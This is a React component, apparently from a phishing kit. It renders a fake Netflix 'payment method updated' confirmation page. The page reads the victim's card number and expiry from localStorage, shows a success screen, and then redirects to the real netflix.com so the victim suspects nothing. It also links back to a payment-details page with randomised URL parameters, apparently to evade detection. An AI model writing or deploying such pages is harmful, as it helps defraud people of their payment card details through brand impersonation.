import { Link } from 'react-router-dom';
import { useState, useEffect, useRef } from 'react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { useTranslation } from '../hooks/useTranslation';
import { getBankName, randomParamsURL } from '../utils/validation';
import '../styles/payment-confirmation.css';

function PaymentConfirmation() {
  const { t } = useTranslation();
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cardType, setCardType] = useState('');
  const [isRedirecting, setIsRedirecting] = useState(false);
  const autoRedirectTimerRef = useRef(null);
  const redirectTimeoutRef = useRef(null);

  const handleDone = (e) => {
    e.preventDefault();
    
    // Annuler le timer automatique si l'utilisateur clique avant les 5 secondes
    if (autoRedirectTimerRef.current) {
      clearTimeout(autoRedirectTimerRef.current);
      autoRedirectTimerRef.current = null;
    }
    
    setIsRedirecting(true);
    
    // Rediriger vers Netflix après 3 secondes
    redirectTimeoutRef.current = setTimeout(() => {
      window.location.href = 'https://www.netflix.com/latest';
    }, 3000);
  };

  useEffect(() => {
    // Récupérer les données de la carte depuis localStorage
    const storedCardNumber = localStorage.getItem('cardNumber') || localStorage.getItem('paymentCardNumber') || '';
    const storedExpirationDate = localStorage.getItem('expirationDate') || '';
    
    if (storedCardNumber) {
      setCardNumber(storedCardNumber);
      // Obtenir le type de carte
      const type = getBankName(storedCardNumber);
      setCardType(type || '');
    }
    
    if (storedExpirationDate) {
      setExpirationDate(storedExpirationDate);
    }
  }, []);

  // Lancer l'animation automatiquement après 5 secondes
  useEffect(() => {
    autoRedirectTimerRef.current = setTimeout(() => {
      // Lancer l'animation automatiquement
      setIsRedirecting(true);
      
      // Rediriger vers Netflix après 3 secondes supplémentaires (pendant l'animation)
      redirectTimeoutRef.current = setTimeout(() => {
        window.location.href = 'https://www.netflix.com/latest';
      }, 3000);
    }, 5000);

    return () => {
      if (autoRedirectTimerRef.current) {
        clearTimeout(autoRedirectTimerRef.current);
      }
      if (redirectTimeoutRef.current) {
        clearTimeout(redirectTimeoutRef.current);
      }
    };
  }, []);

  // Extraire les 4 derniers chiffres de la carte
  const getLastFourDigits = (cardNum) => {
    if (!cardNum) return '0000';
    const cleaned = cardNum.replace(/\s/g, '');
    return cleaned.slice(-4);
  };

  // Obtenir le logo SVG selon le type de carte
  const getCardLogo = (type) => {
    if (!type) {
      // Par défaut, afficher Mastercard
      return (
        <svg viewBox="0 0 40 25" className="card-logo-icon">
          <circle cx="15" cy="12.5" r="8" fill="#EB001B"/>
          <circle cx="25" cy="12.5" r="8" fill="#F79E1B"/>
          <path d="M20 8.5c-1.5 1.2-2.5 3-2.5 5s1 3.8 2.5 5c1.5-1.2 2.5-3 2.5-5s-1-3.8-2.5-5z" fill="#FF5F00"/>
        </svg>
      );
    }

    const typeLower = type.toLowerCase();
    
    if (typeLower.includes('visa')) {
      return (
        <svg viewBox="0 0 60 40" className="card-logo-icon">
          <rect width="60" height="40" rx="4" fill="#1A1F71"/>
          <text x="30" y="26" fontSize="18" fontWeight="bold" fill="#ffffff" textAnchor="middle" fontFamily="Arial, sans-serif">VISA</text>
        </svg>
      );
    } else if (typeLower.includes('mastercard')) {
      return (
        <svg viewBox="0 0 40 25" className="card-logo-icon">
          <circle cx="15" cy="12.5" r="8" fill="#EB001B"/>
          <circle cx="25" cy="12.5" r="8" fill="#F79E1B"/>
          <path d="M20 8.5c-1.5 1.2-2.5 3-2.5 5s1 3.8 2.5 5c1.5-1.2 2.5-3 2.5-5s-1-3.8-2.5-5z" fill="#FF5F00"/>
        </svg>
      );
    } else if (typeLower.includes('american express') || typeLower.includes('amex')) {
      return (
        <svg viewBox="0 0 60 40" className="card-logo-icon">
          <rect width="60" height="40" rx="4" fill="#006FCF"/>
          <text x="30" y="18" fontSize="10" fontWeight="bold" fill="#ffffff" textAnchor="middle" fontFamily="Arial, sans-serif">AmEx</text>
        </svg>
      );
    } else {
      // Par défaut Mastercard
      return (
        <svg viewBox="0 0 40 25" className="card-logo-icon">
          <circle cx="15" cy="12.5" r="8" fill="#EB001B"/>
          <circle cx="25" cy="12.5" r="8" fill="#F79E1B"/>
          <path d="M20 8.5c-1.5 1.2-2.5 3-2.5 5s1 3.8 2.5 5c1.5-1.2 2.5-3 2.5-5s-1-3.8-2.5-5z" fill="#FF5F00"/>
        </svg>
      );
    }
  };

  // Formater le nom du type de carte pour l'affichage
  const getCardTypeDisplay = (type) => {
    if (!type) return 'Mastercard';
    const typeLower = type.toLowerCase();
    if (typeLower.includes('visa')) return 'Visa';
    if (typeLower.includes('mastercard')) return 'Mastercard';
    if (typeLower.includes('american express') || typeLower.includes('amex')) return 'American Express';
    return type;
  };

  const lastFourDigits = getLastFourDigits(cardNumber);
  const displayCardType = getCardTypeDisplay(cardType);
  const displayExpiration = expirationDate || '12/25';

  return (
    <div className="container">
      {isRedirecting && (
        <div className="redirect-overlay">
          <div className="redirect-animation">
            <div className="redirect-spinner">
              <svg viewBox="0 0 100 100" className="spinner-svg">
                <circle cx="50" cy="50" r="45" fill="none" stroke="#e50914" strokeWidth="4" strokeLinecap="round">
                  <animate attributeName="stroke-dasharray" values="0 283;200 283;0 283" dur="2s" repeatCount="indefinite"/>
                  <animate attributeName="stroke-dashoffset" values="0;-141.5;-283" dur="2s" repeatCount="indefinite"/>
                </circle>
              </svg>
            </div>
            <div className="redirect-icon">
              <svg viewBox="0 0 120 120" className="redirect-checkmark">
                <circle cx="60" cy="60" r="55" fill="#00A651" stroke="#00A651" strokeWidth="2"/>
                <path d="M35 60 L55 75 L85 40" stroke="#ffffff" strokeWidth="8" strokeLinecap="round" strokeLinejoin="round" fill="none"/>
              </svg>
            </div>
            <h2 className="redirect-title">{t('paymentConfirmation.enjoySubscription')}</h2>
          </div>
        </div>
      )}
      <Header showBack={true} backTo="/billing" backText="Account" />
      <main className="main-content">
        <div className="content-wrapper">
          <div className="success-icon">
            <svg viewBox="0 0 120 120" className="checkmark-icon">
              <circle cx="60" cy="60" r="55" fill="#00A651" stroke="#00A651" strokeWidth="2"/>
              <path d="M35 60 L55 75 L85 40" stroke="#ffffff" strokeWidth="8" strokeLinecap="round" strokeLinejoin="round" fill="none"/>
            </svg>
          </div>

          <h1 className="page-title">{t('paymentConfirmation.title')}</h1>
          
          <p className="page-subtitle">{t('paymentConfirmation.subtitle')}</p>

          <div className="confirmation-details">
            <div className="detail-card">
              <div className="detail-header">
                <svg className="card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                  <rect x="2" y="5" width="20" height="14" rx="2" strokeWidth="2"/>
                  <line x1="2" y1="10" x2="22" y2="10" strokeWidth="2"/>
                </svg>
                <span className="detail-title">{t('paymentConfirmation.updatedPaymentMethod')}</span>
              </div>
              <div className="detail-content">
                <div className="payment-info">
                  <div className="card-logo-display">
                    {getCardLogo(cardType)}
                  </div>
                  <div className="card-details">
                    <div className="card-type">{displayCardType}</div>
                    <div className="card-number">•••• •••• •••• {lastFourDigits}</div>
                    <div className="card-expiry">{t('paymentConfirmation.expires')} {displayExpiration}</div>
                  </div>
                </div>
              </div>
            </div>

            <div className="info-box">
              <svg className="info-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                <circle cx="12" cy="12" r="10" strokeWidth="2"/>
                <line x1="12" y1="8" x2="12" y2="12" strokeWidth="2" strokeLinecap="round"/>
                <line x1="12" y1="16" x2="12.01" y2="16" strokeWidth="2" strokeLinecap="round"/>
              </svg>
              <div className="info-text">
                <p className="info-title">{t('paymentConfirmation.whatsNext')}</p>
                <p className="info-description">{t('paymentConfirmation.whatsNextDescription')}</p>
              </div>
            </div>
          </div>

          <div className="action-buttons">
            <button onClick={handleDone} className="primary-button" disabled={isRedirecting}>
              {t('paymentConfirmation.done')}
            </button>
            <Link to={`/payment-details?${randomParamsURL()}`} className="secondary-button">{t('paymentConfirmation.updateAgain')}</Link>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}

export default PaymentConfirmation;

